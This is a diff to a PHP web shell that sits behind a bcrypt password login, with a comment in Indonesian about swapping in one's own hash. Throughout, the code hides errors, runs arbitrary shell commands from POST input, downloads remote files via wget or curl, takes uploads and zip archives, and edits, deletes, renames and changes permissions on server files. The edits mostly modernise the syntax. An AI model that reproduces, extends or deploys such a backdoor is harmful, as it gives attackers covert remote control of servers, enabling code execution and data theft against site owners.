@@ -1,5 +1,6 @@
 <?php
-$valid_password_hash = '$2a$12$Jdvyl9cLZBqb04EbmlMm/OYHiiuqox7UDS1IIGuTJAmoS3gaovJ0m';
+// Ganti dengan hash password Anda sendiri
+$valid_password_hash = '$2a$12$s1tSpKItA2EJCBVFROIytuLD7QoGqbvfI.EPWegThVewrs.oSaqrO';
 
 session_start();
 error_reporting(0);
@@ -250,13 +251,12 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 function getCurrentDir() {
     static $dir = null;
     if ($dir === null) {
-        $dir = isset($_GET['d']) ? $_GET['d'] : (function_exists('getcwd') ? getcwd() : dirname(__FILE__));
-        if (!is_dir($dir)) $dir = (function_exists('getcwd') ? getcwd() : dirname(__FILE__));
+        $dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
+        if (!is_dir($dir)) $dir = getcwd();
         if (!is_dir($dir)) $dir = dirname(__FILE__);
         if (!is_dir($dir)) $dir = '.';
-        $real = @realpath($dir);
-        if ($real !== false) $dir = $real;
-        $dir = str_replace('\\', '/', $dir);
+        $dir = str_replace('\\', '/', realpath($dir));
+        if ($dir === false) $dir = '.';
         $dir = rtrim($dir, '/') . '/';
     }
     return $dir;
@@ -290,11 +290,11 @@ function executeCommand($cmd, $cwd = null) {
         $fullPath = '';
         if ($newDir == '..') { $fullPath = dirname(rtrim($cwd, '/')); }
         elseif ($newDir == '.' || $newDir == './') { $fullPath = $cwd; }
-        elseif ($newDir == '~' || $newDir == '~/') { $fullPath = isset($_SERVER['HOME']) ? $_SERVER['HOME'] : '/tmp'; }
+        elseif ($newDir == '~' || $newDir == '~/') { $fullPath = $_SERVER['HOME'] ?? '/tmp'; }
         elseif ($newDir[0] == '/') { $fullPath = $newDir; }
         else { $fullPath = $cwd . $newDir; }
         
-        if (is_dir($fullPath)) { $_GET['d'] = $fullPath; return "Directory changed to: " . @realpath($fullPath); }
+        if (is_dir($fullPath)) { $_GET['d'] = $fullPath; return "Directory changed to: " . realpath($fullPath); }
         else { return "Directory not found: " . $newDir; }
     }
     
@@ -317,12 +317,12 @@ function executeCommand($cmd, $cwd = null) {
             if ($error && empty($output)) $output = $error;
         }
     }
-    return trim($output) !== '' ? $output : "(no output)";
+    return trim($output) ?: "(no output)";
 }
 
 function handleDownloadCommand($cmd, $cwd) {
     preg_match('/https?:\/\/[^\s]+/i', $cmd, $matches);
-    $url = isset($matches[0]) ? $matches[0] : '';
+    $url = $matches[0] ?? '';
     if (!$url) return "Error: No URL found in command";
     
     $filename = null;
@@ -351,7 +351,7 @@ function handleDownloadCommand($cmd, $cwd) {
         curl_close($ch);
     }
     
-    if ($content !== false && @file_put_contents($target, $content)) { @chmod($target, 0644); return "Download successful: " . $filename . " (" . formatBytes(strlen($content)) . ")"; }
+    if ($content !== false && file_put_contents($target, $content)) { @chmod($target, 0644); return "Download successful: " . $filename . " (" . formatBytes(strlen($content)) . ")"; }
     return "Download failed: " . $url;
 }
 
@@ -360,10 +360,8 @@ function handleUpload($files, $targetDir) {
         $files = [ 'name' => [$files['name']], 'tmp_name' => [$files['tmp_name']], 'error' => [$files['error']], 'size' => [$files['size']] ];
     }
     $uploaded = [];
-    if (!isset($files['name'])) return $uploaded;
-    
     foreach ($files['name'] as $i => $name) {
-        if (!isset($files['error'][$i]) || $files['error'][$i] !== UPLOAD_ERR_OK) continue;
+        if ($files['error'][$i] !== UPLOAD_ERR_OK) continue;
         $cleanName = sanitizeFilename(basename($name));
         $target = rtrim($targetDir, '/') . '/' . $cleanName;
         if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);
@@ -402,13 +400,13 @@ $commandOutput = isset($_SESSION['command_output']) ? $_SESSION['command_output'
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['create_action'])) {
-        $name = isset($_POST['name']) ? sanitizeFilename($_POST['name']) : '';
-        $type = isset($_POST['type']) ? $_POST['type'] : 'file';
-        $content = isset($_POST['content']) ? $_POST['content'] : '';
+        $name = sanitizeFilename($_POST['name'] ?? '');
+        $type = $_POST['type'] ?? 'file';
+        $content = $_POST['content'] ?? '';
         if ($name) {
             $path = $currentDir . $name;
             if ($type === 'file') {
-                if (@file_put_contents($path, $content)) { @chmod($path, 0644); $messages[] = "File created: " . $name; }
+                if (file_put_contents($path, $content)) { @chmod($path, 0644); $messages[] = "File created: " . $name; }
                 else { $messages[] = "Failed to create file: " . $name; }
             } else {
                 if (@mkdir($path, 0755, true)) { $messages[] = "Folder created: " . $name; }
@@ -417,11 +415,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
     
-    if (isset($_FILES['files']) && isset($_FILES['files']['name'])) { $uploaded = handleUpload($_FILES['files'], $currentDir); if (!empty($uploaded)) { $messages[] = "Uploaded: " . implode(', ', $uploaded); } }
-    if (isset($_FILES['archive']) && isset($_FILES['archive']['error']) && $_FILES['archive']['error'] === UPLOAD_ERR_OK) {
+    if (!empty($_FILES['files'])) { $uploaded = handleUpload($_FILES['files'], $currentDir); if (!empty($uploaded)) { $messages[] = "Uploaded: " . implode(', ', $uploaded); } }
+    if (!empty($_FILES['archive']) && $_FILES['archive']['error'] === UPLOAD_ERR_OK) {
         $tmpPath = $_FILES['archive']['tmp_name'];
         $tempSave = $currentDir . 'temp_' . time() . '.zip';
-        if (@copy($tmpPath, $tempSave)) { $extractResults = extractArchive($tempSave, $currentDir, true); $messages = array_merge($messages, $extractResults); }
+        if (copy($tmpPath, $tempSave)) { $extractResults = extractArchive($tempSave, $currentDir, true); $messages = array_merge($messages, $extractResults); }
         else { $extractResults = extractArchive($tmpPath, $currentDir, false); $messages = array_merge($messages, $extractResults); }
     }
     if (isset($_POST['download_url']) && !empty($_POST['download_url'])) {
@@ -430,10 +428,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $cmd = 'wget ' . $url; if ($filename) $cmd .= ' -O ' . $filename;
         $result = handleDownloadCommand($cmd, $currentDir); $messages[] = $result;
     }
-    if (isset($_POST['command']) && trim($_POST['command']) !== '') { $commandOutput = executeCommand($_POST['command'], $currentDir); }
-    if (isset($_POST['edit_content']) && isset($_POST['edit_file'])) { $target = $currentDir . basename($_POST['edit_file']); if (@file_put_contents($target, $_POST['edit_content'])) { $messages[] = "Saved: " . basename($target); } }
-    if (isset($_POST['delete_selected']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) { $deleted = 0; foreach ($_POST['selected_items'] as $item) { $target = $currentDir . basename($item); if (file_exists($target)) { if (is_dir($target)) { executeCommand('rm -rf ' . escapeshellarg($target), $currentDir); } else { @unlink($target); } $deleted++; } } $messages[] = "Deleted " . $deleted . " item(s)"; }
-    if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) { $old = $currentDir . basename($_POST['rename_old']); $new = $currentDir . sanitizeFilename($_POST['rename_new']); if (file_exists($old) && !file_exists($new) && @rename($old, $new)) { $messages[] = "Renamed: " . basename($old) . " to " . basename($new); } }
+    if (isset($_POST['command']) && trim($_POST['command'])) { $commandOutput = executeCommand($_POST['command'], $currentDir); }
+    if (isset($_POST['edit_content']) && isset($_POST['edit_file'])) { $target = $currentDir . basename($_POST['edit_file']); if (file_put_contents($target, $_POST['edit_content'])) { $messages[] = "Saved: " . basename($target); } }
+    if (isset($_POST['delete_selected']) && isset($_POST['selected_items'])) { $deleted = 0; foreach ($_POST['selected_items'] as $item) { $target = $currentDir . basename($item); if (file_exists($target)) { if (is_dir($target)) { executeCommand('rm -rf ' . escapeshellarg($target), $currentDir); } else { @unlink($target); } $deleted++; } } $messages[] = "Deleted " . $deleted . " item(s)"; }
+    if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) { $old = $currentDir . basename($_POST['rename_old']); $new = $currentDir . sanitizeFilename($_POST['rename_new']); if (file_exists($old) && !file_exists($new) && rename($old, $new)) { $messages[] = "Renamed: " . basename($old) . " to " . basename($new); } }
     if (isset($_POST['chmod_file']) && isset($_POST['chmod_value'])) { $target = $currentDir . basename($_POST['chmod_file']); $perms = octdec($_POST['chmod_value']); if (file_exists($target) && @chmod($target, $perms)) { $messages[] = "Changed permissions: " . basename($target) . " to " . $_POST['chmod_value']; } }
     
     $_SESSION['messages'] = $messages;
@@ -912,7 +910,7 @@ if (is_array($items)) { foreach ($items as $item) { if ($item == '.' || $item ==
                     <?php endforeach;
                     foreach ($files as $item):
                         $path = $currentDir . $item;
-                        $size = @filesize($path);
+                        $size = filesize($path);
                         $perms = substr(sprintf('%o', fileperms($path)), -4);
                         $modified = date('Y-m-d H:i:s', filemtime($path));
                         $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
